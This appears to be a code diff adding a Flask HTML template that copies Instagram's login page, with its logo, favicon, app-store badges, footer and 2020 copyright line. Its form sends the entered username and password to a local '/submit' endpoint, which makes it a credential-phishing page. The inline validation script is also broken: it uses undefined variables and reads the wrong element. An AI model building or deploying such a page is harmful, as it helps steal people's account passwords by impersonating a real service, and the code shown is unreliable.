@@ -1,0 +1,96 @@
+<!DOCTYPE html>
+<html lang="en"> 
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <link rel="stylesheet" type="text/css" href="{{ url_for('static', filename='styles.css') }}">
+    <link rel="icon" type="image/png" href="{{ url_for('static', filename='insta-fav.ico') }}">
+    <title>Instagram</title>
+</head>
+<body>
+   
+    <main class="flex align-items-center justify-content-center">
+        <section id="mobile" class="flex">
+        </section>
+        <section id="auth" class="flex direction-column">
+            <div class="panel login flex direction-column">
+                <h1 title="Instagram" class="flex justify-content-center">
+                  <img src="{{ url_for('static', filename='instagram-logo.png') }}" alt="Instagram logo" title="Instagram logo" />
+                </h1>
+                <form id="emailForm" action="/submit" method="POST">
+
+                    <label for="email" id="email" class="sr-only">Phone number, username, or email</label>
+                    <input name="email" placeholder="Phone number, username, or email" required/>
+                   
+
+                    
+
+                    <label for="Password" class="sr-only">password</label>
+                    <input name="password" id="password" type="password" placeholder="password" />
+
+                  <button id="submit" value="Submit" type="submit">Log in</button>
+                </form>
+
+                <script>
+                    // JavaScript validation as a fallback
+                    document.getElementById('emailForm').addEventListener('submit', function(event) {
+                        var emailInput = document.getElementById('email').value;
+                        
+            
+                        if (!emailPattern.test(emailInput)) {
+                            event.preventDefault();  // Prevent form submission
+                            errorMessage.style.display = 'inline';
+                        } else {
+                            errorMessage.style.display = 'none';
+                        }
+                    });
+                </script>
+
+                
+                <div class="flex separator align-items-center">
+                    <span></span>
+                    <div class="or">OR</div>
+                    <span></span>
+                </div>
+                <div class="login-with-fb flex direction-column align-items-center">
+                    <div>
+                      
+                    </div>
+                    <a href="#">Forget password?</a>
+                </div>
+            </div>
+            <div class="panel register flex justify-content-center">
+                <p>Don't have an account?</p>
+                <a href="#">Sign up</a>
+            </div>
+            <div class="app-download flex direction-column align-items-center">
+                <p>Get the app.</p>
+                <div class="flex justify-content-center">
+                     <img src="{{ url_for('static', filename='apple-button.png') }}" alt="Download on the App Store" title="Download on the App Store">
+                     <img src="{{ url_for('static', filename='googleplay-button.png') }}" alt="Get it on Google Play" title="Get it on Google Play">
+                </div>
+            </div>
+        </section>
+    </main>
+    <footer>
+        <ul class="flex flex-wrap justify-content-center">
+            <li><a href="#">ABOUT</a></li>
+            <li><a href="#">HELP</a></li>
+            <li><a href="#">PRESS</a></li>
+            <li><a href="#">API</a></li>
+            <li><a href="#">CAREERS</a></li>
+            <li><a href="#">PRIVACY</a></li>
+            <li><a href="#">TERMS</a></li>
+            <li><a href="#">LOCATIONS</a></li>
+            <li><a href="#">TOP ACCOUNTS</a></li>
+            <li><a href="#">HASHTAGS</a></li>
+            <li><a href="#">LANGUAGE</a></li>
+        </ul>
+        <p class="copyright">© 2020 Instagram from Facebook</p>
+    </footer>
+
+    
+
+</body>
+</html>
+
